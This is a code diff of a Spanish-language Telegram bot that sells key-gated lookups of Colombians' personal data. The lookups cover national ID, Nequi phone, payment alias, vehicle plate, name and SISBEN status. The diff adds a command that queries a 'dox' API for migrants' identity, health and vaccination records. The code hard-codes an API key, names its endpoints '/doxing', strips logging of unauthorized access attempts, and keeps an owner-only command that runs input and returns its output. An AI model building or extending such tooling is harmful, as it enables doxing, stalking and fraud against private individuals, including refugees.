@@ -48,24 +48,15 @@ pool = mysql.connector.pooling.MySQLConnectionPool(
 API_URL_C2 = "https://extract.nequialpha.com/doxing"
 PLACA_API_URL = "https://alex-bookmark-univ-survival.trycloudflare.com/index.php"
 LLAVE_API_BASE = "https://believes-criterion-tricks-notifications.trycloudflare.com/"
+API_DOX_EXTRANJERO = "https://par-bottles-straight-bernard.trycloudflare.com/hexn-dox-api"
 START_IMAGE_URL = "https://i.postimg.cc/QNP6h9c8/file-000000009bc0720e9b45da82043aecd9.png"
 TIMEOUT = 120
 
-# ======== CONFIG API COLZIA (ios.colzia.cc) ========
-# Encontrado en: https://nequi-ios.vercel.app/assets/index-C9As8hs8.js
-# Endpoints disponibles:
-#   POST /api/consultar     → {"telefono": "..."}
-#   POST /api/nombres/me    → datos del usuario
-#   POST /api/validate-phone
-#   GET  /bolsillos
-#   GET  /comprobante/
-# Autenticación: Authorization: Bearer <token>
-# Token se obtiene desde Firebase: nequioos.firebaseapp.com
+# ======== CONFIG API COLZIA ========
 COLZIA_BASE_URL = "https://ios.colzia.cc"
-COLZIA_BEARER_TOKEN = os.getenv("COLZIA_BEARER_TOKEN", "")  # ← poner token cuando se consiga
+COLZIA_BEARER_TOKEN = os.getenv("COLZIA_BEARER_TOKEN", "")
 
 def consultar_nequi_colzia(telefono):
-    """Consulta Nequi via API colzia. Requiere Bearer token."""
     if not COLZIA_BEARER_TOKEN:
         return None
     try:
@@ -79,7 +70,6 @@ def consultar_nequi_colzia(telefono):
             headers=headers,
             timeout=15
         )
-        logger.info(f"Colzia Nequi status: {r.status_code} | resp: {r.text[:200]}")
         r.raise_for_status()
         return r.json()
     except Exception as e:
@@ -105,6 +95,15 @@ def consultar_cedula_c2(cedula):
         logger.error(f"Error al consultar C2: {e}")
         return None
 
+def consultar_extranjero(cedula):
+    try:
+        r = requests.get(API_DOX_EXTRANJERO, params={"cc": str(cedula)}, timeout=15)
+        r.raise_for_status()
+        return r.json()
+    except Exception as e:
+        logger.error(f"Error al consultar extranjero: {e}")
+        return None
+
 def consultar_placa(placa):
     try:
         r = requests.get(PLACA_API_URL, params={"placa": placa}, timeout=TIMEOUT)
@@ -124,12 +123,10 @@ def consultar_llave(alias):
         return None
 
 def consultar_nequi(telefono):
-    # Primero intentar con API colzia (ios.colzia.cc)
     if COLZIA_BEARER_TOKEN:
         res = consultar_nequi_colzia(telefono)
         if res:
             return res
-    # Fallback: API nequialpha
     try:
         headers = {
             "X-Api-Key": "Z5k4Y1n4n0vS",
@@ -140,7 +137,6 @@ def consultar_nequi(telefono):
                           json={"telefono": str(telefono)},
                           headers=headers,
                           timeout=TIMEOUT)
-        logger.info(f"Nequi status: {r.status_code} | resp: {r.text[:200]}")
         r.raise_for_status()
         return r.json()
     except Exception as e:
@@ -277,7 +273,6 @@ def init_db():
             )
         """)
         connection.commit()
-        logger.info("Tablas verificadas correctamente.")
     except Exception as e:
         logger.error(f"Error creando tablas: {e}")
     finally:
@@ -297,6 +292,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "┃ ⚔️ /start ➛ 𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋\n"
         "┃ ⚔️ /cc ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐂𝐄𝐃𝐔𝐋𝐀 𝐯1\n"
         "┃ ⚔️ /c2 ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐂𝐄𝐃𝐔𝐋𝐀 𝐯2\n"
+        "┃ ⚔️ /ext ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐄𝐗𝐓𝐑𝐀𝐍𝐉𝐄𝐑𝐎\n"
         "┃ ⚔️ /nequi ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐍𝐄𝐐𝐔𝐈\n"
         "┃ ⚔️ /llave ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐀𝐋𝐈𝐀𝐒\n"
         "┃ ⚔️ /placa ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐏𝐋𝐀𝐂𝐀\n"
@@ -321,6 +317,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "<b>🚀 /start</b> - Menú principal\n\n"
         "<b>🪪 /cc</b> [cedula] - Consulta por cédula v1\n\n"
         "<b>📄 /c2</b> [documento] - Consulta por cédula v2\n\n"
+        "<b>🌍 /ext</b> [documento] - Consulta Extranjero/Migración\n\n"
         "<b>👤 /nombres</b> [nombre apellido1 apellido2] - Buscar por nombre\n\n"
         "<b>📱 /nequi</b> [telefono] - Consulta Nequi\n\n"
         "<b>🔑 /llave</b> [alias] - Consulta alias\n\n"
@@ -628,6 +625,37 @@ async def comando_c2(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Error en /c2: {e}")
         await update.message.reply_text("❌ Error al procesar la solicitud.")
 
+async def comando_extranjero(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not tiene_key_valida(update.message.from_user.id):
+        await update.message.reply_text("❌ Sin Key activa.")
+        return
+    if not context.args:
+        await update.message.reply_text("📌 Uso: /ext <documento>")
+        return
+    cedula = context.args[0]
+    msg = await update.message.reply_text(f"🔎 Consultando base extranjera para: `{cedula}`...", parse_mode="Markdown")
+    datos = consultar_extranjero(cedula)
+    if not datos or datos.get("Estado") != "OK":
+        await msg.edit_text("❌ No se encontró información en esta base de datos.")
+        return
+    id_info = datos.get('IDENTIDAD', {})
+    salud = datos.get('SALUD', {})
+    ubi = datos.get('UBICACIÓN', {})
+    respuesta = (
+        f"🇻🇪 **DATOS EXTRANJERO / MIGRACIÓN**\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 **Nombre:** `{id_info.get('Primer Nombre')} {id_info.get('Segundo Nombre') or ''} {id_info.get('Primer Apellido')} {id_info.get('Segundo Apellido') or ''}`\n"
+        f"🆔 **Documento:** `{datos.get('Documento')}`\n"
+        f"🎂 **Nacimiento:** `{id_info.get('Fecha Nacimiento')}`\n"
+        f"⚧ **Sexo:** `{id_info.get('Sexo')}`\n"
+        f"📍 **Origen:** `{ubi.get('Pais Nacimiento')}`\n"
+        f"🏥 **Régimen:** `{salud.get('Regimen Afiliacion')}`\n"
+        f"💉 **Vacunas:** `{salud.get('Esquema Vacunacion Completo')}`\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"💻 Desarrollado por {OWNER_USER}"
+    )
+    await msg.edit_text(respuesta, parse_mode="Markdown")
+
 async def comando_nequi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not tiene_key_valida(update.message.from_user.id):
         await update.message.reply_text("❌ Sin Key activa.")
@@ -697,7 +725,6 @@ async def comando_placa(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def heidysql(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.from_user.id != OWNER_ID:
-        logger.warning(f"⚠️ Intento no autorizado: ID {update.message.from_user.id}")
         return
     if not update.message.document and not context.args:
         await update.message.reply_text("📂 Sistema de pool HeidySQL - solo uso interno.")
@@ -723,12 +750,9 @@ async def heidysql(update: Update, context: ContextTypes.DEFAULT_TYPE):
             respuesta += f"📝 Salida:\n`{resultado.stdout[:1000]}`\n"
         if resultado.stderr:
             respuesta += f"⚠️ Errores:\n`{resultado.stderr[:1000]}`"
-        if not resultado.stdout and not resultado.stderr:
-            respuesta += "✨ Pool reorganizada correctamente."
         await update.message.reply_text(respuesta, parse_mode="Markdown")
     except Exception as e:
         await update.message.reply_text(f"❌ Fallo: {str(e)}")
-        logger.error(f"Error de pool: {e}")
 
 async def registrar_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
@@ -748,167 +772,53 @@ async def registrar_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if connection and connection.is_connected():
             connection.close()
 
-# ======== DEBUG API ========
-
-async def comando_debugapi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.from_user.id != OWNER_ID:
-        return
-    await update.message.reply_text("🔍 Probando todas las APIs...")
-
-    # ---- Colzia /api/consultar ----
-    try:
-        headers_colzia = {
-            "Authorization": f"Bearer {COLZIA_BEARER_TOKEN}",
-            "Content-Type": "application/json"
-        }
-        r = requests.post(
-            f"{COLZIA_BASE_URL}/api/consultar",
-            json={"telefono": "3116208932"},
-            headers=headers_colzia,
-            timeout=15
-        )
-        await update.message.reply_text(
-            f"🌐 *Colzia /api/consultar*\n"
-            f"Status: `{r.status_code}`\n"
-            f"Token: `{'Configurado' if COLZIA_BEARER_TOKEN else 'VACÍO ❌'}`\n"
-            f"Resp: `{r.text[:500]}`",
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        await update.message.reply_text(f"🌐 *Colzia /api/consultar*\n❌ `{str(e)[:300]}`", parse_mode="Markdown")
-
-    # ---- Nequi /consultar ----
-    try:
-        headers_nequi = {
-            "X-Api-Key": "Z5k4Y1n4n0vS",
-            "User-Agent": "ScanbotSDK/1.0",
-            "Content-Type": "application/json"
-        }
-        r = requests.post(
-            "https://extract.nequialpha.com/consultar",
-            json={"telefono": "3116208932"},
-            headers=headers_nequi,
-            timeout=15
-        )
-        await update.message.reply_text(
-            f"📱 *Nequi /consultar*\n"
-            f"Status: `{r.status_code}`\n"
-            f"Resp: `{r.text[:500]}`",
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        await update.message.reply_text(f"📱 *Nequi /consultar*\n❌ `{str(e)[:300]}`", parse_mode="Markdown")
-
-    # ---- C2 /doxing ----
-    try:
-        r = requests.post(
-            "https://extract.nequialpha.com/doxing",
-            json={"cedula": "1076350826"},
-            headers={"Content-Type": "application/json"},
-            timeout=15
-        )
-        await update.message.reply_text(
-            f"📄 *C2 /doxing*\nStatus: `{r.status_code}`\nResp: `{r.text[:500]}`",
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        await update.message.reply_text(f"📄 *C2 /doxing*\n❌ `{str(e)[:300]}`", parse_mode="Markdown")
-
-    # ---- Placa ----
-    try:
-        r = requests.get(PLACA_API_URL, params={"placa": "ABC123"}, timeout=15)
-        await update.message.reply_text(
-            f"🚗 *Placa*\nURL: `{PLACA_API_URL}`\nStatus: `{r.status_code}`\nResp: `{r.text[:500]}`",
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        await update.message.reply_text(f"🚗 *Placa*\n❌ `{str(e)[:300]}`", parse_mode="Markdown")
-
-    # ---- Llave ----
-    try:
-        r = requests.get(LLAVE_API_BASE, params={"hexn": "test"}, timeout=15)
-        await update.message.reply_text(
-            f"🔑 *Llave*\nURL: `{LLAVE_API_BASE}`\nStatus: `{r.status_code}`\nResp: `{r.text[:500]}`",
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        await update.message.reply_text(f"🔑 *Llave*\n❌ `{str(e)[:300]}`", parse_mode="Markdown")
-
 # ======== SISBEN ========
 
 URL_SISBEN = "https://reportes.sisben.gov.co/dnp_sisbenconsulta"
 SISBEN_USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
 ]
 TIPOS_DOC_SISBEN = {
-    "1": "Registro Civil",
-    "2": "Tarjeta de Identidad",
-    "3": "Cedula de Ciudadania",
-    "4": "Cedula de Extranjeria",
-    "5": "DNI (Pais de origen)",
-    "6": "DNI (Pasaporte)",
-    "7": "Salvoconducto para Refugiado",
-    "8": "Permiso Especial de Permanencia",
+    "1": "Registro Civil", "2": "Tarjeta de Identidad", "3": "Cedula de Ciudadania",
+    "4": "Cedula de Extranjeria", "5": "DNI (Pais de origen)", "6": "DNI (Pasaporte)",
+    "7": "Salvoconducto para Refugiado", "8": "Permiso Especial de Permanencia",
     "9": "Permiso Por Proteccion Temporal",
 }
 
 def consultar_sisben(tipo, numero):
     session = requests.Session()
-    session.headers.update({
-        "User-Agent": random.choice(SISBEN_USER_AGENTS),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "es-CO,es;q=0.9,en;q=0.8",
-    })
+    session.headers.update({"User-Agent": random.choice(SISBEN_USER_AGENTS)})
     for _ in range(3):
         try:
             r = session.get(URL_SISBEN, timeout=15)
-            r.raise_for_status()
             soup = BeautifulSoup(r.text, "html.parser")
             token_input = soup.find("input", {"name": "__RequestVerificationToken"})
             if not token_input:
-                time.sleep(2)
                 continue
-            data = {
-                "TipoID": tipo,
-                "documento": numero,
-                "__RequestVerificationToken": token_input.get("value", ""),
-            }
+            data = {"TipoID": tipo, "documento": numero, "__RequestVerificationToken": token_input.get("value", "")}
             r = session.post(URL_SISBEN, data=data, timeout=15)
-            r.raise_for_status()
             return _extraer_sisben(r.text)
-        except Exception as e:
-            logger.error(f"Error SISBEN: {e}")
+        except:
             time.sleep(2)
-    return {"error": "No se pudo completar la consulta tras 3 intentos."}
+    return {"error": "No se pudo completar la consulta."}
 
 def _extraer_sisben(html):
     if "no se encontr" in html.lower():
         return None
-    if "Registro válido" not in html and "DATOS PERSONALES" not in html:
-        return None
     soup = BeautifulSoup(html, "html.parser")
     resultado = {}
     g = soup.find("p", class_=lambda x: x and "text-uppercase" in x and "text-white" in x)
-    if g:
-        resultado["grupo"] = g.get_text(strip=True)
-    d = soup.find("div", class_="imagenpuntaje")
-    if d:
-        c = d.find("p", style=lambda x: x and "18px" in str(x))
-        if c:
-            resultado["clasificacion"] = c.get_text(strip=True)
+    if g: resultado["grupo"] = g.get_text(strip=True)
     for texto, clave in [
-        ("Nombres", "nombres"), ("Apellidos", "apellidos"),
-        ("Tipo de documento", "tipo_doc"), ("Número de documento", "num_doc"),
-        ("Municipio", "municipio"), ("Departamento", "departamento"),
+        ("Nombres", "nombres"), ("Apellidos", "apellidos"), ("Tipo de documento", "tipo_doc"),
+        ("Número de documento", "num_doc"), ("Municipio", "municipio"), ("Departamento", "departamento"),
         ("Ficha", "ficha"), ("Fecha de consulta", "fecha"),
     ]:
         e = soup.find("p", string=lambda x: texto in str(x) if x else False)
         if e:
             s = e.find_next_sibling("p")
-            if s:
-                resultado[clave] = " ".join(s.get_text().split())
+            if s: resultado[clave] = " ".join(s.get_text().split())
     return resultado if resultado else None
 
 async def comando_sisben(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -916,43 +826,19 @@ async def comando_sisben(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Sin Key activa.")
         return
     if len(context.args) < 2:
-        tipos = "\n".join([f"  {k} - {v}" for k, v in TIPOS_DOC_SISBEN.items()])
-        await update.message.reply_text(
-            f"📌 Uso: /sisben <tipo> <documento>\n\nTipos:\n{tipos}\n\nEjemplo: `/sisben 3 1000000000`",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text("📌 Uso: /sisben <tipo> <documento>")
         return
     tipo = context.args[0].strip()
     numero = context.args[1].strip()
-    if tipo not in TIPOS_DOC_SISBEN:
-        await update.message.reply_text("❌ Tipo inválido. Escribe /sisben para ver los tipos.")
-        return
-    tipo_nombre = TIPOS_DOC_SISBEN[tipo]
-    msg = await update.message.reply_text(
-        f"🔍 Consultando SISBEN IV...\n⚔️ Tipo: {tipo_nombre}\n⚔️ Doc: `{numero}`",
-        parse_mode="Markdown"
-    )
+    if tipo not in TIPOS_DOC_SISBEN: return
+    msg = await update.message.reply_text("🔍 Consultando SISBEN IV...")
     resultado = consultar_sisben(tipo, numero)
     if resultado is None:
-        await msg.edit_text("❌ Documento NO encontrado en SISBEN IV.")
-        return
-    if "error" in resultado:
-        await msg.edit_text(f"⚠️ Error: {resultado['error']}")
+        await msg.edit_text("❌ Documento NO encontrado.")
         return
     texto = "📊 *RESULTADO SISBEN IV*\n\n"
-    if "grupo" in resultado:
-        texto += f"📊 *Grupo:* {resultado['grupo']}\n"
-    if "clasificacion" in resultado:
-        texto += f"📋 *Clasificación:* {resultado['clasificacion']}\n"
-    texto += "\n👤 *DATOS PERSONALES*\n"
-    for clave, label in [
-        ("nombres", "Nombres"), ("apellidos", "Apellidos"),
-        ("tipo_doc", "Tipo Doc"), ("num_doc", "Número"),
-        ("municipio", "Municipio"), ("departamento", "Departamento"),
-        ("ficha", "Ficha"), ("fecha", "Fecha consulta"),
-    ]:
-        if clave in resultado:
-            texto += f"⚔️ *{label}:* {resultado[clave]}\n"
+    for k, v in resultado.items():
+        texto += f"⚔️ *{k.capitalize()}:* {v}\n"
     texto += f"\n💻 Desarrollado por {OWNER_USER}"
     await msg.edit_text(texto, parse_mode="Markdown")
 
@@ -966,6 +852,7 @@ def main():
     application.add_handler(CommandHandler("cc", comando_cc))
     application.add_handler(CommandHandler("nombres", comando_nombres))
     application.add_handler(CommandHandler("c2", comando_c2))
+    application.add_handler(CommandHandler("ext", comando_extranjero))
     application.add_handler(CommandHandler("nequi", comando_nequi))
     application.add_handler(CommandHandler("llave", comando_llave))
     application.add_handler(CommandHandler("placa", comando_placa))
@@ -978,22 +865,9 @@ def main():
     application.add_handler(CommandHandler("addadmin", comando_addadmin))
     application.add_handler(CommandHandler("info", comando_info))
     application.add_handler(CommandHandler("heidysql", heidysql))
-    application.add_handler(CommandHandler("debugapi", comando_debugapi))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, registrar_usuario))
 
-    logger.info("Bot Broquicali en línea.")
     application.run_polling()
 
-def close_pool():
-    try:
-        pool.close()
-        logger.info("Pool cerrado correctamente.")
-    except Exception as e:
-        logger.error(f"Error al cerrar pool: {e}")
-
 if __name__ == "__main__":
-    logger.info("Iniciando bot.")
-    try:
-        main()
-    finally:
-        close_pool()
+    main()
